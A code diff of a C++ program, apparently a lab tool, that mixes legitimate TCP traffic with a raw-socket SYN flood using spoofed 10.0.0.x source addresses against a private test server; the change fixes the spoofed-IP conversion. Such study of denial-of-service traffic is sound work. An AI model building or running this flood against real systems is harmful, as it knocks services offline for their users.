@@ -1,4 +1,4 @@
-// client_raw.cpp
+// majorClient.cpp
 #include <iostream>
 #include <thread>
 #include <chrono>
@@ -18,7 +18,7 @@ const char* SERVER_IP = "192.168.64.3";
 const int SERVER_PORT = 8080;
 const char* CLIENT_IP = "192.168.64.2"; // Real client IP for legitimate traffic
 
-// Pseudo header for TCP checksum (required for raw TCP)
+// Pseudo header for TCP checksum
 struct pseudo_header {
     uint32_t source_address;
     uint32_t dest_address;
@@ -44,7 +44,7 @@ unsigned short checksum(void* data, int length) {
     return (unsigned short)(~sum);
 }
 
-// Legitimate traffic function (unchanged from previous)
+// Legitimate traffic function (unchanged)
 void legitimate_traffic(bool& stop_flag) {
     while (!stop_flag) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -110,7 +110,8 @@ void syn_flood_raw(bool& stop_flag) {
         iph->frag_off = 0;
         iph->ttl = 255;
         iph->protocol = IPPROTO_TCP;
-        iph->saddr = inet_addr("10.0.0." + to_string(dis(gen) % 256)); // Spoofed IP
+        string spoofed_ip = "10.0.0." + to_string(dis(gen) % 256); // Create spoofed IP as string
+        iph->saddr = inet_addr(spoofed_ip.c_str()); // Convert to C-string
         iph->daddr = inet_addr(SERVER_IP);
 
         // TCP Header
@@ -119,7 +120,7 @@ void syn_flood_raw(bool& stop_flag) {
         tcph->dest = htons(SERVER_PORT);
         tcph->seq = htonl(rand()); // Random sequence number
         tcph->ack_seq = 0;
-        tcph->doff = 5; // Data offset (header length in 32-bit words)
+        tcph->doff = 5; // Data offset
         tcph->syn = 1; // SYN flag set
         tcph->window = htons(5840);
         tcph->urg = 0;
